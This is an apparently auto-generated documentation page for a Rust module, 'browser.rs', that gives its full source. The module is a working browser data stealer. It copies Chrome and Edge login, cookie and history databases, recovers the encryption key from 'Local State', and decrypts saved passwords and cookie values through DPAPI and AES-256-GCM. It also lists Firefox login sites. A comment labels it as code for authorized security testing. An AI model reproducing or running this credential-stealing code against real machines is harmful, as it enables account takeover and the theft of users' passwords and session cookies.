# browser

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/browser.rs` |
| **Lines** | 390 |
| **Cards** | T023-client-capabilities |
| **Role** | Browser session management |
| **Unsafe blocks** | 1 |
| **Feature gates** | aes-gcm |

## Types

### struct `BrowserDataResult` (line 10)

## Public API

### `read_browser_data` (line 40)
```rust
pub fn read_browser_data(browser: &str, data_type: &str) -> BrowserDataResult
```

## Internal Functions

- `ok` (line 19)
- `err` (line 29)
- `chromium_paths` (line 50)
- `get_chrome_aes_key` (line 66)
- `dpapi_decrypt` (line 80)
- `chrome_decrypt_pw` (line 114)
- `aes_256_gcm_decrypt` (line 146)
- `win_aes_gcm_decrypt` (line 171)
- `copy_to_temp` (line 183)
- `read_chromium_data` (line 195)
- `read_login_data` (line 260)
- `read_history` (line 286)
- `read_cookies` (line 311)
- `read_firefox_data` (line 345)

## Key Dependencies

- `use serde::{Deserialize, Serialize};`
- `use tracing::{warn, error};`
- `use base64::Engine as _;`
- `use windows::Win32::Foundation::{HLOCAL, LocalFree};`
- `use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};`
- `use aes_gcm::{Aes256Gcm, Key, Nonce};`
- `use aes_gcm::aead::{Aead, KeyInit, Payload};`

## Full Source

```rust
// Browser data extraction for authorized security testing.
// Reads Chrome/Edge login data, history, cookies (SQLite files).
// Decrypts passwords using DPAPI (CryptUnprotectData) and AES-256-GCM.
// Firefox: reads logins.json metadata only (NSS not required).

use serde::{Deserialize, Serialize};
use tracing::{warn, error};

#[derive(Debug, Serialize, Deserialize)]
pub struct BrowserDataResult {
    pub browser: String,
    pub r#type: String,
    pub entries: Vec<serde_json::Value>,
    pub count: usize,
    pub error: Option<String>,
}

impl BrowserDataResult {
    fn ok(browser: &str, data_type: &str, entries: Vec<serde_json::Value>) -> Self {
        let count = entries.len();
        BrowserDataResult {
            browser: browser.to_string(),
            r#type: data_type.to_string(),
            entries,
            count,
            error: None,
        }
    }
    fn err(browser: &str, data_type: &str, msg: &str) -> Self {
        BrowserDataResult {
            browser: browser.to_string(),
            r#type: data_type.to_string(),
            entries: Vec::new(),
            count: 0,
            error: Some(msg.to_string()),
        }
    }
}

pub fn read_browser_data(browser: &str, data_type: &str) -> BrowserDataResult {
    match browser {
        "chrome" | "edge" => read_chromium_data(browser, data_type),
        "firefox" => read_firefox_data(data_type),
        _ => BrowserDataResult::err(browser, data_type, "Unknown browser"),
    }
}

// ---- Chromium (Chrome / Edge) ----

fn chromium_paths(browser: &str) -> Option<(std::path::PathBuf, std::path::PathBuf)> {
    let local = std::env::var("LOCALAPPDATA").ok()?;
    let (profile_dir, local_state) = match browser {
        "chrome" => (
            format!("{}/Google/Chrome/User Data/Default", local),
            format!("{}/Google/Chrome/User Data/Local State", local),
        ),
        "edge" => (
            format!("{}/Microsoft/Edge/User Data/Default", local),
            format!("{}/Microsoft/Edge/User Data/Local State", local),
        ),
        _ => return None,
    };
    Some((profile_dir.into(), local_state.into()))
}

fn get_chrome_aes_key(local_state_path: &std::path::Path) -> Option<Vec<u8>> {
    let content = std::fs::read_to_string(local_state_path).ok()?;
    let state: serde_json::Value = serde_json::from_str(&content).ok()?;
    let enc_key_b64 = state["os_crypt"]["encrypted_key"].as_str()?;
    use base64::Engine as _;
    let enc_key = base64::engine::general_purpose::STANDARD.decode(enc_key_b64).ok()?;
    // First 5 bytes are "DPAPI" prefix
    if enc_key.len() <= 5 {
        return None;
    }
    let raw = &enc_key[5..];
    dpapi_decrypt(raw)
}

fn dpapi_decrypt(ciphertext: &[u8]) -> Option<Vec<u8>> {
    #[cfg(windows)]
    {
        use windows::Win32::Foundation::{HLOCAL, LocalFree};
        use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

        unsafe {
            let data_in = CRYPT_INTEGER_BLOB {
                cbData: ciphertext.len() as u32,
                pbData: ciphertext.as_ptr() as *mut u8,
            };
            let mut data_out = CRYPT_INTEGER_BLOB { cbData: 0, pbData: std::ptr::null_mut() };

            if CryptUnprotectData(
                &data_in,
                None,
                None,
                None,
                None,
                0,
                &mut data_out,
            ).is_ok()
            {
                if data_out.cbData > 0 && !data_out.pbData.is_null() {
                    let result = std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();
                    let _ = LocalFree(HLOCAL(data_out.pbData.cast()));
                    return Some(result);
                }
            }
        }
    }
    None
}

fn chrome_decrypt_pw(encrypted_value: &[u8], aes_key: Option<&[u8]>) -> String {
    if encrypted_value.is_empty() {
        return String::new();
    }

    // v10 prefix → AES-256-GCM
    if encrypted_value.starts_with(b"v10") {
        if let Some(key) = aes_key {
            if encrypted_value.len() > 15 {
                let iv = &encrypted_value[3..15];
                let ciphertext_and_tag = &encrypted_value[15..];
                if ciphertext_and_tag.len() >= 16 {
                    let ct_len = ciphertext_and_tag.len() - 16;
                    let ct = &ciphertext_and_tag[..ct_len];
                    let tag = &ciphertext_and_tag[ct_len..];

                    if let Ok(plaintext) = aes_256_gcm_decrypt(key, iv, ct, tag) {
                        return String::from_utf8_lossy(&plaintext).to_string();
                    }
                }
            }
        }
    }

    // Fallback: DPAPI
    if let Some(dec) = dpapi_decrypt(encrypted_value) {
        return String::from_utf8_lossy(&dec).to_string();
    }

    String::new()
}

fn aes_256_gcm_decrypt(key: &[u8], iv: &[u8], ciphertext: &[u8], tag: &[u8]) -> anyhow::Result<Vec<u8>> {
    // Pure-Rust AES-256-GCM using the aes-gcm crate (optional).
    // If not available, return error — the caller falls back to DPAPI.
    #[cfg(feature = "aes-gcm")]
    {
        use aes_gcm::{Aes256Gcm, Key, Nonce};
        use aes_gcm::aead::{Aead, KeyInit, Payload};

        let cipher_key = Key::<Aes256Gcm>::from_slice(key);
        let cipher = Aes256Gcm::new(cipher_key);
        let nonce = Nonce::from_slice(iv);

        let mut ct_with_tag = ciphertext.to_vec();
        ct_with_tag.extend_from_slice(tag);

        cipher.decrypt(nonce, ct_with_tag.as_ref())
            .map_err(|e| anyhow::anyhow!("AES-GCM decrypt failed: {:?}", e))
    }
    #[cfg(not(feature = "aes-gcm"))]
    {
        // Without aes-gcm feature, attempt manual decryption via Windows BCrypt
        win_aes_gcm_decrypt(key, iv, ciphertext, tag)
    }
}

fn win_aes_gcm_decrypt(key: &[u8], iv: &[u8], ciphertext: &[u8], tag: &[u8]) -> anyhow::Result<Vec<u8>> {
    #[cfg(windows)]
    {
        // Use BCryptDecrypt with AES-GCM via Windows CNG
        // This is complex to implement from scratch; fall back to a simple approach.
        // For now, return an error to trigger DPAPI fallback.
        anyhow::bail!("AES-GCM not implemented without aes-gcm feature");
    }
    #[cfg(not(windows))]
    anyhow::bail!("AES-GCM not available on non-Windows")
}

fn copy_to_temp(src: &std::path::Path) -> anyhow::Result<std::path::PathBuf> {
    let tmp = std::env::temp_dir().join(format!(
        "sp_browser_{}.db",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos()
    ));
    std::fs::copy(src, &tmp)?;
    Ok(tmp)
}

fn read_chromium_data(browser: &str, data_type: &str) -> BrowserDataResult {
    let (profile_dir, local_state_path) = match chromium_paths(browser) {
        Some(p) => p,
        None => return BrowserDataResult::err(browser, data_type, "Could not determine profile path"),
    };

    let aes_key = get_chrome_aes_key(&local_state_path);

    match data_type {
        "passwords" => {
            let db_src = profile_dir.join("Login Data");
            if !db_src.exists() {
                return BrowserDataResult::err(browser, data_type, "Login Data not found");
            }
            let tmp = match copy_to_temp(&db_src) {
                Ok(p) => p,
                Err(e) => return BrowserDataResult::err(browser, data_type, &e.to_string()),
            };
            let result = read_login_data(&tmp, aes_key.as_deref());
            let _ = std::fs::remove_file(&tmp);
            match result {
                Ok(entries) => BrowserDataResult::ok(browser, data_type, entries),
                Err(e) => BrowserDataResult::err(browser, data_type, &e.to_string()),
            }
        }
        "history" => {
            let db_src = profile_dir.join("History");
            if !db_src.exists() {
                return BrowserDataResult::err(browser, data_type, "History not found");
            }
            let tmp = match copy_to_temp(&db_src) {
                Ok(p) => p,
                Err(e) => return BrowserDataResult::err(browser, data_type, &e.to_string()),
            };
            let result = read_history(&tmp);
            let _ = std::fs::remove_file(&tmp);
            match result {
                Ok(entries) => BrowserDataResult::ok(browser, data_type, entries),
                Err(e) => BrowserDataResult::err(browser, data_type, &e.to_string()),
            }
        }
        "cookies" => {
            let db_src = {
                let p1 = profile_dir.join("Network").join("Cookies");
                let p2 = profile_dir.join("Cookies");
                if p1.exists() { p1 } else { p2 }
            };
            if !db_src.exists() {
                return BrowserDataResult::err(browser, data_type, "Cookies file not found");
            }
            let tmp = match copy_to_temp(&db_src) {
                Ok(p) => p,
                Err(e) => return BrowserDataResult::err(browser, data_type, &e.to_string()),
            };
            let result = read_cookies(&tmp, aes_key.as_deref());
            let _ = std::fs::remove_file(&tmp);
            match result {
                Ok(entries) => BrowserDataResult::ok(browser, data_type, entries),
                Err(e) => BrowserDataResult::err(browser, data_type, &e.to_string()),
            }
        }
        _ => BrowserDataResult::err(browser, data_type, "Unknown data_type"),
    }
}

fn read_login_data(path: &std::path::Path, aes_key: Option<&[u8]>) -> anyhow::Result<Vec<serde_json::Value>> {
    let conn = rusqlite::Connection::open(path)?;
    let mut stmt = conn.prepare(
        "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user=0",
    )?;
    let mut entries = Vec::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let user: String = row.get(1)?;
        let enc_pw: Vec<u8> = row.get(2)?;
        Ok((url, user, enc_pw))
    })?;
    for row in rows.flatten() {
        let (url, user, enc_pw) = row;
        let pw = chrome_decrypt_pw(&enc_pw, aes_key);
        if !user.is_empty() || !pw.is_empty() {
            entries.push(serde_json::json!({
                "url": url,
                "username": user,
                "password": pw,
            }));
        }
    }
    Ok(entries)
}

fn read_history(path: &std::path::Path) -> anyhow::Result<Vec<serde_json::Value>> {
    let conn = rusqlite::Connection::open(path)?;
    let mut stmt = conn.prepare(
        "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500",
    )?;
    let mut entries = Vec::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: Option<String> = row.get(1)?;
        let visits: i64 = row.get(2)?;
        let ts: i64 = row.get(3)?;
        Ok((url, title, visits, ts))
    })?;
    for row in rows.flatten() {
        let (url, title, visits, ts) = row;
        entries.push(serde_json::json!({
            "url": url,
            "title": title.unwrap_or_default(),
            "visits": visits,
            "ts": ts,
        }));
    }
    Ok(entries)
}

fn read_cookies(path: &std::path::Path, aes_key: Option<&[u8]>) -> anyhow::Result<Vec<serde_json::Value>> {
    let conn = rusqlite::Connection::open(path)?;
    let mut stmt = conn.prepare(
        "SELECT host_key, name, encrypted_value, path, is_secure FROM cookies LIMIT 1000",
    )?;
    let mut entries = Vec::new();
    let rows = stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let name: String = row.get(1)?;
        let enc_val: Vec<u8> = row.get(2)?;
        let path: String = row.get(3)?;
        let secure: i64 = row.get(4)?;
        Ok((host, name, enc_val, path, secure))
    })?;
    for row in rows.flatten() {
        let (host, name, enc_val, path, secure) = row;
        let val = if !enc_val.is_empty() {
            chrome_decrypt_pw(&enc_val, aes_key)
        } else {
            String::new()
        };
        entries.push(serde_json::json!({
            "host": host,
            "name": name,
            "value": val,
            "path": path,
            "secure": secure != 0,
        }));
    }
    Ok(entries)
}

// ---- Firefox ----

fn read_firefox_data(data_type: &str) -> BrowserDataResult {
    if data_type != "passwords" {
        return BrowserDataResult::err("firefox", data_type, "Only passwords supported for Firefox");
    }

    let appdata = match std::env::var("APPDATA") {
        Ok(v) => v,
        Err(_) => return BrowserDataResult::err("firefox", data_type, "APPDATA not set"),
    };

    let profiles_dir = std::path::PathBuf::from(&appdata)
        .join("Mozilla")
        .join("Firefox")
        .join("Profiles");

    if !profiles_dir.exists() {
        return BrowserDataResult::err("firefox", data_type, "Firefox profiles not found");
    }

    let mut entries = Vec::new();

    if let Ok(dir) = std::fs::read_dir(&profiles_dir) {
        for entry in dir.flatten().take(3) {
            let logins_path = entry.path().join("logins.json");
            if logins_path.exists() {
                if let Ok(content) = std::fs::read_to_string(&logins_path) {
                    if let Ok(data) = serde_json::from_str::<serde_json::Value>(&content) {
                        if let Some(logins) = data.get("logins").and_then(|l| l.as_array()) {
                            let profile_name = entry.file_name().to_string_lossy().to_string();
                            for login in logins {
                                entries.push(serde_json::json!({
                                    "url": login.get("hostname").and_then(|v| v.as_str()).unwrap_or(""),
                                    "username": "(encrypted)",
                                    "password": "(encrypted — NSS required)",
                                    "profile": profile_name,
                                }));
                            }
                        }
                    }
                }
            }
        }
    }

    BrowserDataResult::ok("firefox", data_type, entries)
}

```